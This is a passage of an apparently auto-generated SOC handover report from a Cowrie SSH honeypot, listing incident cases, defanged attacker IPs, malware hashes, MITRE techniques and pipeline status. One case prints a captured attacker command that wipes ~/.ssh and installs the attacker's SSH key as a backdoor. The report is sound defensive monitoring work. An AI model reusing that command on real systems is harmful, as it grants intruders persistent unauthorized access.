- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4197564d2b8b

| Field | Detail |
|---|---|
| **Source IP** | `103.82.21[.]8` |
| **First Seen** | 2026-05-25 15:00 |
| **Last Seen** | 2026-05-25 15:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 15:00:43` | `cowrie.session.connect` |
| `2026-05-25 15:00:43` | `cowrie.client.version` |
| `2026-05-25 15:00:43` | `cowrie.client.kex` |
| `2026-05-25 15:00:44` | `cowrie.login.success` |
| `2026-05-25 15:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.21[.]8` to AbuseIPDB if not already reported
- [ ] Block `103.82.21[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89363fa7c19c

| Field | Detail |
|---|---|
| **Source IP** | `103.82.21[.]8` |
| **First Seen** | 2026-05-25 15:05 |
| **Last Seen** | 2026-05-25 15:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 15:05:01` | `cowrie.session.connect` |
| `2026-05-25 15:05:01` | `cowrie.client.version` |
| `2026-05-25 15:05:01` | `cowrie.client.kex` |
| `2026-05-25 15:05:01` | `cowrie.login.success` |
| `2026-05-25 15:05:02` | `cowrie.session.params` |
| `2026-05-25 15:05:02` | `cowrie.command.input` |
| `2026-05-25 15:05:02` | `cowrie.command.failed` |
| `2026-05-25 15:05:02` | `cowrie.log.closed` |
| `2026-05-25 15:05:02` | `cowrie.session.params` |
| `2026-05-25 15:05:02` | `cowrie.command.input` |
| `2026-05-25 15:05:02` | `cowrie.session.file_download` |
| `2026-05-25 15:05:02` | `cowrie.log.closed` |
| `2026-05-25 15:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.21[.]8` to AbuseIPDB if not already reported
- [ ] Block `103.82.21[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34cf452aa38c

| Field | Detail |
|---|---|
| **Source IP** | `103.82.21[.]8` |
| **First Seen** | 2026-05-25 15:05 |
| **Last Seen** | 2026-05-25 15:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 15:05:04` | `cowrie.session.connect` |
| `2026-05-25 15:05:04` | `cowrie.client.version` |
| `2026-05-25 15:05:04` | `cowrie.client.kex` |
| `2026-05-25 15:05:05` | `cowrie.login.success` |
| `2026-05-25 15:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.21[.]8` to AbuseIPDB if not already reported
- [ ] Block `103.82.21[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `197.248.8[.]33` | **19** | 2026-05-25 13:51 | 2026-05-25 14:25 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.248.159[.]82` | **15** | 2026-05-25 10:19 | 2026-05-25 10:58 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **9** | 2026-05-25 10:33 | 2026-05-25 14:23 | 8m | 0 | `T1592` | 🟢 LOW |
| `197.140.18[.]248` | **8** | 2026-05-25 13:03 | 2026-05-25 14:09 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `101.79.165[.]128` | **3** | 2026-05-25 10:16 | 2026-05-25 10:25 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `103.82.21[.]8` | **3** | 2026-05-25 13:50 | 2026-05-25 15:05 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `175.178.33[.]230` | **2** | 2026-05-25 12:41 | 2026-05-25 12:43 | 4m | 0 | `T1592` | 🟢 LOW |
| `18.218.63[.]61` | **2** | 2026-05-25 13:24 | 2026-05-25 13:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.224.252[.]214` | **2** | 2026-05-25 13:30 | 2026-05-25 13:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.192[.]33` | **2** | 2026-05-25 13:56 | 2026-05-25 13:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.20.204[.]47` | **2** | 2026-05-25 12:52 | 2026-05-25 12:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.124.174[.]247` | **2** | 2026-05-25 12:42 | 2026-05-25 12:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `64.227.40[.]111` | **2** | 2026-05-25 10:57 | 2026-05-25 10:58 | 1m | 0 | `T1592` | 🟢 LOW |
| `113.31.107[.]103` | 1 | 2026-05-25 15:10 | 2026-05-25 15:10 | 8s | 0 | `T1592` | 🟢 LOW |
| `118.145.213[.]116` | 1 | 2026-05-25 14:00 | 2026-05-25 14:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.51[.]94` | 1 | 2026-05-25 11:37 | 2026-05-25 11:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.86[.]94` | 1 | 2026-05-25 10:36 | 2026-05-25 10:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.241.117[.]94` | 1 | 2026-05-25 10:32 | 2026-05-25 10:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.39[.]73` | 1 | 2026-05-25 14:47 | 2026-05-25 14:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]141` | 1 | 2026-05-25 13:04 | 2026-05-25 13:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.32.130[.]144` | 1 | 2026-05-25 14:22 | 2026-05-25 14:22 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.105[.]165` | 1 | 2026-05-25 10:53 | 2026-05-25 10:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.191.83[.]123` | 1 | 2026-05-25 12:30 | 2026-05-25 12:30 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `200.39.46[.]41` | 1 | 2026-05-25 14:08 | 2026-05-25 14:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.207.240[.]8` | 1 | 2026-05-25 12:29 | 2026-05-25 12:29 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `54.208.25[.]95` | 1 | 2026-05-25 12:56 | 2026-05-25 12:56 | 1s | 0 | `T1592` | 🟢 LOW |
| `70.121.186[.]205` | 1 | 2026-05-25 14:19 | 2026-05-25 14:19 | 13s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]87` | 1 | 2026-05-25 14:53 | 2026-05-25 14:53 | 10s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `175.178.33[.]230` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 2 |
| `3.20.204[.]47` | US | Amazon Technologies Inc. | **100** ⚠️ | 2 |
| `49.207.240[.]8` | IN | Beam Telecom Pvt Ltd | **100** ⚠️ | 0 |
| `200.39.46[.]41` | BR | Terracel Provedor de Internet Ltda Me | **100** ⚠️ | 50 |
| `152.32.130[.]144` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 31 |
| `197.248.8[.]33` | KE | Safaricom Limited | **100** ⚠️ | 50 |
| `101.79.165[.]128` | HK | CDNetworks | **100** ⚠️ | 2 |
| `182.191.83[.]123` | PK | Corporate | **100** ⚠️ | 31 |
| `197.140.18[.]248` | DZ | Icosnet SPA | **100** ⚠️ | 11 |
| `118.196.51[.]94` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 12 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 119 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 55 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 52 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 29 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 29 |

---

## 🔕 False Positive Summary (101 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 10 below threshold 25 | 25 |
| AbuseIPDB score 24 below threshold 25 | 52 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 21 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 242 cases |
| Tool 34  | Credential Extractor        | ✅ 107 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 40 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 101 filtered (41.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 30 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 55 priority case(s) shown individually · 28 recon entry/entries in table (13 group(s) consolidating 71 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-25T15:16:05Z_
